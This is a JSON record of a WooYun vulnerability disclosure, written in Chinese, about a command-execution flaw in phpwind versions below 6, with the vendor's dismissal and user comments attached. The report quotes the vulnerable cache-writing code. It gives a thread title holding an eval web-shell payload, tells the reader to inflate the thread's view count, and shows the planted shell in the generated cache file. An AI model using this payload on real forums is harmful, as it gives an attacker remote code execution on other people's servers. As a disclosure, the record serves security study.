{"id": 73880, "wybug_id": "wooyun-2015-0153256", "wybug_title": "phpwind &lt; v6 版本命令执行漏洞", "wybug_corp": "phpwind", "wybug_author": "猪猪侠", "wybug_date": "2015-11-10 12:06", "wybug_open_date": "2016-02-08 15:10", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-10：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2016-01-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-08：\t细节向公众公开  简要描述： 07年的漏洞，一个轻松简单就能利用的漏洞 详细说明：  phpwind/sort.php 会定期每天处理一次帖子的浏览量、回复量、精华版排序代码直接使用savearray将数据库查询出来的内容写入php文件，savearray出来的参数，都使用\"双引号来包含，所以可以利用变量来执行任意命令\nelseif($action=='article'){\t$cachetime=@filemtime(D_P.\"data/bbscache/article_sort.php\");\tif(!$per || $timestamp-$cachetime>$per*3600){\t\t$_SORTDB=$_sort=array();\t\t$query=$db->query(\"SELECT t.tid,t.subject,t.replies,t.fid FROM pw_threads t LEFT JOIN pw_forums f ON t.fid=f.fid WHERE t.ifcheck='1' AND t.locked<'2' AND f.password='' AND f.allowvisit='' AND f.f_type<>'hidden' ORDER BY t.replies DESC LIMIT $cachenum\");\t\twhile($topic=$db->fetch_array($query)){\t\t\tif($topic['replies']){\t\t\t\t$topic['subject']=substrs($topic['subject'],25);\t\t\t\t$_sort[]=$topic;\t\t\t}\t\t}\t\t$_SORTDB['reply']=$_sort;\t\t$_sort=array();\t\t$query=$db->query(\"SELECT t.tid,t.subject,t.hits,t.fid FROM pw_threads t LEFT JOIN pw_forums f ON t.fid=f.fid WHERE t.ifcheck='1' AND t.locked<'2' AND f.password='' AND f.allowvisit='' AND f.f_type<>'hidden' ORDER BY t.hits DESC LIMIT $cachenum\");\t\twhile($topic=$db->fetch_array($query)){\t\t\tif($topic['hits']){\t\t\t\t$topic['subject']=substrs($topic['subject'],25);\t\t\t\t$_sort[]=$topic;\t\t\t}\t\t}\t\t$_SORTDB['hit']=$_sort;\t\t$_sort=array();\t\t$query=$db->query(\"SELECT t.tid,t.subject,t.digest,t.fid FROM pw_threads t LEFT JOIN pw_forums f ON t.fid=f.fid WHERE t.digest<>'0' AND t.ifcheck='1' AND t.locked<'2' AND f.password='' AND f.allowvisit='' AND f.f_type<>'hidden'  ORDER BY t.lastpost DESC LIMIT $cachenum\");\t\twhile($topic=$db->fetch_array($query)){\t\t\t$topic['subject']=substrs($topic['subject'],25);\t\t\t$_sort[]=$topic;\t\t}\t\t$_SORTDB['digest']=$_sort;\t\t$ARTICLEDB=savearray('_ARTICLEDB',$_SORTDB);\t\twriteover(D_P.'data/bbscache/article_sort.php',\"<?php\\r\\n\".$ARTICLEDB.'?>');\t}\n发表一个帖子：标题如下\n${@eval($_POST[x])}XXXX\n\n\n再开一个多线程(100线程，几分钟就可以了)，请求访问那个帖子，直到帖子的访问量排入前20\nfunction savearray($name,$array){\t$arraydb=\"\\$$name=array(\\r\\n\\t\\t\";\tforeach($array as $key=>$value){\t\t$arraydb.=\"'\".$key.\"'=>\\narray(\\r\\n\\t\\t\\t\";\t\tforeach($value as $value1){\t\t\t$arraydb.='array(';\t\t\tforeach($value1 as $value2){\t\t\t\t$arraydb.='\"'.addslashes($value2).'\",';\t\t\t}\t\t\t$arraydb.=\"),\\r\\n\\t\\t\\t\";\t\t}\t\t$arraydb.=\"),\\r\\n\\t\\t\";\t}\t$arraydb.=\");\\r\\n\";\treturn $arraydb;\n第二天，生成统计排行的时候，shell就躺在了 /data/bbscache/article_sort.php三个白帽实际演示：http://**.**.**.**/data/bbscache/article_sort.php\n\n   漏洞证明：  /data/bbscache/article_sort.php\n<?php$_ARTICLEDB=array(\t\t'reply'=>array(\t\t\tarray(\"1\",\"${@eval($_POST[x])}XXXX ..\",\"5732\",\"2\",),\t\t\tarray(\"10\",\"DDDDDDDDDDDDDDDDD\",\"20\",\"2\",),\t\t\tarray(\"7\",\"HI Everybody (  b)ம\",\"8\",\"2\",),\t\t\tarray(\"3\",\"hello\",\"5\",\"2\",),\t\t\tarray(\"5\",\"䜲⊔\",\"3\",\"2\",),\t\t\tarray(\"2\",\"test\",\"3\",\"2\",),\t\t\tarray(\"9\",\"AAAAAAAAAAAAA\",\"2\",\"2\",),\t\t\tarray(\"6\",\"ִА⫢,\"1\",\"2\",),\t\t\tarray(\"8\",\"⵽բ萾ዢ,\"1\",\"2\",),\t\t\t),\t\t'hit'=>array(\t\t\tarray(\"1\",\"${@eval($_POST[x])}XXXX ..\",\"11382\",\"2\",),\t\t\tarray(\"2\",\"test\",\"3235\",\"2\",),\t\t\tarray(\"3\",\"hello\",\"985\",\"2\",),\t\t\tarray(\"5\",\"䜲⊔\",\"331\",\"2\",),\t\t\tarray(\"7\",\"HI Everybody (  b)ம\",\"123\",\"2\",),\n   修复方案：  使用单引号处理来自客户端可控的变量   版权声明：转载请注明来源 猪猪侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-02-08 15:10 厂商回复： 您好，由于phpwind目前仅维护phpwind8.7及以上版本，其他低版本已不再维护更新。该问题暂不会影响到新版本的用户，建议仍在使用低版本的用户尽快升级到最新版。 漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-11-10 12:12 |    \t\t土夫子 \t\t\t( 普通白帽子  |\t\t\t        Rank:433 漏洞数:76        | 看似山穷水尽，终将柳喑花明)\t\t \n  坐等公开    \n     2015-11-10 12:13 |    \t\t不能忍 \t\t\t( 实习白帽子  |\t\t\t        Rank:80 漏洞数:41        | 要是能重来，我要选李白!)\t\t \n  留名    \n     2015-11-10 12:19 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1830 漏洞数:150        | 如果大海能够带走我的矮丑...)\t\t \n  快去1024shell了把我的账号解禁，妈蛋    \n     2015-11-10 12:20 |    \t\thecate \t\t\t( 普通白帽子  |\t\t\t        Rank:722 漏洞数:110        | ®高级安全工程师 | WooYun认证√)\t\t \n  藏了这么久才放出来    \n     2015-11-10 12:23 |    \t\tniexinming \t\t\t( 普通白帽子  |\t\t\t        Rank:177 漏洞数:34        | 好好学习，天天日站)\t\t \n  坐等公开    \n     2015-11-10 12:26 |    \t\tsqlfeng \t\t\t( 普通白帽子  |\t\t\t        Rank:343 漏洞数:52        | http://weibo.com/fds1986)\t\t \n  球１０２４　帐号    \n     2015-11-10 12:43 |    \t\tDNS \t\t\t( 普通白帽子  |\t\t\t        Rank:696 漏洞数:73        | root@qisec.com)\t\t \n  你关注的白帽子 猪猪侠 发表了漏洞 phpwind < v6 版本命令执行漏洞    \n     2015-11-10 13:49 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  我就说嘛  有0day的~     \n     2015-11-10 14:03 |    \t\t0xev4l \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 努力吧！骚年！北京买房买车买菜！)\t\t \n  坐等0day    \n     2015-11-10 14:17 |    \t\t世纪缘 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:4        | 专注无线网络安全！)\t\t \n  坐等0day    \n     2015-11-10 16:03 |    \t\tAnnabelle \t\t\t( 实习白帽子  |\t\t\t        Rank:56 漏洞数:17        | .)\t\t \n  话说，有卖1024邀请码的吗...多少WB啊？    \n     2015-11-10 16:12 |    \t\t大师兄 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:7        | 每日必关注乌云)\t\t \n  @Annabelle 乌云集市有......(*^__^*)     \n     2015-11-25 09:15 |    \t\t紫藤居士 \t\t\t( 实习白帽子  |\t\t\t        Rank:43 漏洞数:8        | 我是来向大神们学习的)\t\t \n  坐等大牛放1024邀请码    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}